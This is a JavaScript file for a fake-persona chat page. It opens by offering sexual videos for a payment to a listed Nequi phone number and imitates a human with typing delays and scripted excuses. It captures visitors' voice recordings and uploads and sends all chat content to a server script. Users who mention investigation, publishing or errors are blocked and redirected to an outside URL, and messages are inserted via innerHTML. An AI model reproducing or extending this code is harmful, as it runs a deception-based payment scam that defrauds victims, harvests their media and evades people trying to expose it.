const redirectUrl = "https://hequi.netlify.app/";

// Detect if the user is on a mobile device
function isMobile() {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    return /android|avantgo|blackberry|bada|iphone|ipad|ipod|kindle|mobile|opera m(ob|in)i|phone|palm|pie|tablet|up\.browser|up\.link|webos|wos/i.test(userAgent);
}

// Redirect if the user is on a PC and explicitly allowed
if (!isMobile() && localStorage.getItem('allowRedirect') === 'true') {
    window.location.href = redirectUrl;
}

$(document).ready(function() {
    $("#user-input").emojioneArea({
        pickerPosition: "top",
        tonesStyle: "bullet"
    });

    // Check if the user is blocked
    if (localStorage.getItem('isBlocked') === 'true') {
        window.location.href = redirectUrl;
    } else {
        // Send initial greeting message
        sendMessageWithRandomDelay('∆mor🔥¡ Comprame mi C0NT3N1D0 solo con 10Mil a mi Nequi 3164909368 y te envió 90√ideos C@li€nt€s como tu los quieras bb❤️.');
    }
});

// Function to manually enable redirection for PC users
function enablePcRedirect() {
    localStorage.setItem('allowRedirect', 'true');
    alert("Redirection is now enabled for PC. Please reload the page.");
}


let mediaRecorder;

let audioChunks = [];

const messageTone = new Audio('nuevo.mp3'); // Ruta al archivo de audio



document.getElementById('record-voice').addEventListener('click', () => {

    if (!mediaRecorder || mediaRecorder.state === "inactive") {

        navigator.mediaDevices.getUserMedia({ audio: true })

            .then(stream => {

                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.start();

                mediaRecorder.ondataavailable = event => {

                    audioChunks.push(event.data);

                };

                mediaRecorder.onstop = () => {

                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });

                    audioChunks = [];

                    const reader = new FileReader();

                    reader.onload = function(e) {

                        displayMessage('user', { type: 'voice', content: e.target.result });

                        handleIncomingMessage({ type: 'audio', content: e.target.result });

                    };

                    reader.readAsDataURL(audioBlob);

                };

            })

            .catch(error => console.error(error));

    } else if (mediaRecorder.state === "recording") {

        mediaRecorder.stop();

    }

});



function sendMessage() {

    const userInput = $("#user-input").data("emojioneArea").getText();

    const message = userInput.trim();



    if (message === '') return;



    displayMessage('user', { type: 'text', content: message });

    $("#user-input").data("emojioneArea").setText('');



    setTimeout(() => {

        const botResponse = handleIncomingMessage({ type: 'text', content: message });

        if (botResponse) {

            displayMessage('bot', botResponse);

        }

    }, 1000);

}



function sendMedia() {

    const fileInput = document.getElementById('media-input');

    const file = fileInput.files[0];

    if (file) {

        const reader = new FileReader();

        reader.onload = function(e) {

            const fileType = file.type.split('/')[0];

            if (fileType === 'image' || fileType === 'video') {

                displayMessage('user', { type: fileType, content: e.target.result });

                handleIncomingMessage({ type: fileType, content: e.target.result });

            }

        };

        reader.readAsDataURL(file);

    }

}



function displayMessage(sender, message) {

    const chatBox = document.getElementById('chat-box');

    const messageElement = document.createElement('div');

    messageElement.classList.add('message', sender);



    if (message.type === 'text') {

        messageElement.classList.add('text');

        messageElement.innerHTML = message.content;

    } else if (message.type === 'image') {

        messageElement.classList.add('media');

        const img = document.createElement('img');

        img.src = message.content;

        img.style.maxWidth = '100%';

        messageElement.appendChild(img);

    } else if (message.type === 'voice') {

        messageElement.classList.add('media');

        const audio = document.createElement('audio');

        audio.controls = true;

        audio.autoplay = true;

        audio.src = message.content;

        audio.setAttribute('controlsList', 'nodownload'); // Disable download

        audio.addEventListener('contextmenu', (e) => e.preventDefault()); // Prevent right-click menu

        messageElement.appendChild(audio);

    } else if (message.type === 'video') {

        messageElement.classList.add('media');

        const video = document.createElement('video');

        video.controls = true;

        video.autoplay = true;

        video.src = message.content;

        video.style.maxWidth = '100%';

        video.setAttribute('controlsList', 'nodownload'); // Disable download

        video.addEventListener('contextmenu', (e) => e.preventDefault()); // Prevent right-click menu

        messageElement.appendChild(video);

    }



    chatBox.appendChild(messageElement);

    chatBox.scrollTop = chatBox.scrollHeight;



    // Enviar el mensaje al servidor PHP para guardar en la base de datos

    $.ajax({

        url: 'save_message.php',

        type: 'POST',

        data: {

            sender: sender,

            messageType: message.type,

            content: message.content

        },

        success: function(response) {

            console.log(response);

        },

        error: function(xhr, status, error) {

            console.error("Error saving message: " + error);

        }

    });



    if (sender === 'bot') {

        messageTone.play(); // Reproduce el tono de mensaje

    }

}





const keywordResponses = [

    {

        keywords: ["investigacion","publicar"],

        blockUser: true, // This keyword will block the user

    },

    {

  keywords: ["hola", "hla"],

  responses: ['Hola'],

  },



  // Tienes WhatsApp


  {

  keywords: ["trabajas", "se dedica"],

  sequences: [

    [

      ['enviar audio trabajo1.ogg', 6000],

      ['y tu en que trabajas??', 6000],

    ],

    [

      ['trabajo aveces', 6000],

      ['enviar audio trabajas2.ogg', 6000],

    ],

  ],

  },












];















const randomResponses = [

  'Bueno',

   'Sii',

];

const audioResponses = [

    'los audios no los puedo escuchar',

    'me puedes escribir mi telefono tiene mal el sonido',

    'no puedo escuchar bien los audios',

    'No puedo escuchar el audio bb'

];



function removeAccents(str) {

    return str.normalize("NFD").replace(/[\u0300-\u036f]/g, "");

}



function getRandomResponse(responsesList, usedResponses) {

    const availableResponses = responsesList.filter(response => !usedResponses.includes(response));

    if (availableResponses.length === 0) {

        usedResponses.length = 0; // Reset used responses if all have been used

        return getRandomResponse(responsesList, usedResponses);

    }

    const randomIndex = Math.floor(Math.random() * availableResponses.length);

    const selectedResponse = availableResponses[randomIndex];

    usedResponses.push(selectedResponse);

    return selectedResponse;

}



// Función para calcular la distancia de Levenshtein

function findSequence(message) {

    if (message.type === 'text') {

        const lowercaseMessage = removeAccents(message.content.toLowerCase());

        for (const response of keywordResponses) {

            const keywords = response.keywords;

            const found = keywords.some(keyword => {

                const lowercaseKeyword = removeAccents(keyword.toLowerCase());

                return lowercaseMessage.includes(lowercaseKeyword);

            });

            if (found) {

                return response;

            }

        }

    }

    return null;

}







async function sendSequenceMessages(sequences, usedSequences) {

    const availableSequences = sequences.filter(sequence => !usedSequences.includes(sequence));

    if (availableSequences.length === 0) {

        usedSequences.length = 0; // Reset used sequences if all have been used

        return sendSequenceMessages(sequences, usedSequences);

    }

    const randomSequenceIndex = Math.floor(Math.random() * availableSequences.length);

    const randomSequence = availableSequences[randomSequenceIndex];

    usedSequences.push(randomSequence);



    for (const [message, interval] of randomSequence) {

        await sendMessageWithRandomDelay(message);

    }

}



let typingIndicatorVisible = false; // Variable to track typing indicator visibility

let usedTextResponses = [];

let usedSequences = [];



async function sendMessageWithRandomDelay(message)    {

    const typingDelay = Math.floor(Math.random() *000) + 000; //

    const sendDelay = Math.floor(Math.random() * 000) + 000; //4000
5000


    await new Promise(resolve => setTimeout(resolve, typingDelay));



    const chatBox = document.getElementById('chat-box');



    if (!typingIndicatorVisible) {

        typingIndicatorVisible = true;

        const typingIndicator = document.createElement('div');

        typingIndicator.classList.add('message', 'bot');

        typingIndicator.innerHTML = '<div class="typing-indicator"><span></span><span></span><span></span></div>';

        typingIndicator.id = 'typing-indicator';

        chatBox.appendChild(typingIndicator);

        chatBox.scrollTop = chatBox.scrollHeight;

    }



    await new Promise(resolve => setTimeout(resolve, sendDelay));



    const typingIndicator = document.getElementById('typing-indicator');

    if (typingIndicator) {

        chatBox.removeChild(typingIndicator);

        typingIndicatorVisible = false;

    }



    // Check if it's a request to send a video, image, or audio

    if (message.startsWith('enviar video')) {

        const videoPath = message.substring(12).trim();

        displayMessage('bot', { type: 'video', content: videoPath });

    } else if (message.startsWith('enviar imagen')) {

        const imagePath = message.substring(13).trim();

        displayMessage('bot', { type: 'image', content: imagePath });

    } else if (message.startsWith('enviar audio')) {

        const audioPath = message.substring(12).trim();

        displayMessage('bot', { type: 'voice', content: audioPath });

    } else {

        displayMessage('bot', { type: 'text', content: message });

    }

}



function handleIncomingMessage(message) {

    const senderID = 'current_user'; // For the web version, use a placeholder ID

    const userBlocked = localStorage.getItem('isBlocked') === 'true';



    if (userBlocked) {

        console.log(`No response for user ${senderID}.`);

        window.location.href = redirectUrl; // Redirect to the specified URL

        return null; // Do not respond to blocked users

    }



    if (message.type === 'audio') {

        const randomAudioResponse = getRandomResponse(audioResponses, usedTextResponses);

        sendMessageWithRandomDelay(randomAudioResponse);

        return null; // Exit the function after sending the audio response

    }



    if (message.type !== 'text' || !/[a-zA-Z]/.test(message.content)) {

        // Check if the message is an image, video, or text without letters from A to Z

        sendMessageWithRandomDelay('❤️');

        return null;

    }



    const matchedResponse = findSequence(message);



    if (matchedResponse) {

        if (matchedResponse.responses) {

            const randomResponse = getRandomResponse(matchedResponse.responses, usedTextResponses);

            sendMessageWithRandomDelay(randomResponse); // Use delay for responses

            return null; // Return null to prevent direct response

        } else if (matchedResponse.sequences) {

            const sequences = matchedResponse.sequences;

            sendSequenceMessages(sequences, usedSequences);

        }



        if (matchedResponse.blockUser) {

            const blockReason = matchedResponse.keywords.join(', '); // Get the keyword for blocking

            localStorage.setItem('isBlocked', 'true'); // Block the user

            console.log(`User ${senderID} blocked.`);

            window.location.href = redirectUrl; // Redirect to the specified URL

            return null;

        }

    } else {

        // No keyword sequence found

        if (containsKeyword(message.content, "error") || containsKeyword(message.content, "fallo")) {

            localStorage.setItem('isBlocked', 'true'); // Block the user

            console.log(`User ${senderID} blocked without sending a message.`);

            window.location.href = redirectUrl; // Redirect to the specified URL

            return null; // Exit function after blocking user

        } else {

            // Respond with a random message for unknown inputs

            const randomResponse = getRandomResponse(randomResponses, usedTextResponses);

            sendMessageWithRandomDelay(randomResponse); // Use delay for random responses

            return null; // Return null to prevent direct response

        }

    }



    // Save the conversation (omitted for the web version)



    return null; // Do not send "Mensaje recibido."

}



function containsKeyword(text, keyword) {

    const normalizedText = removeAccents(text.toLowerCase());

    const normalizedKeyword = removeAccents(keyword.toLowerCase());

    return normalizedText.includes(normalizedKeyword);

}
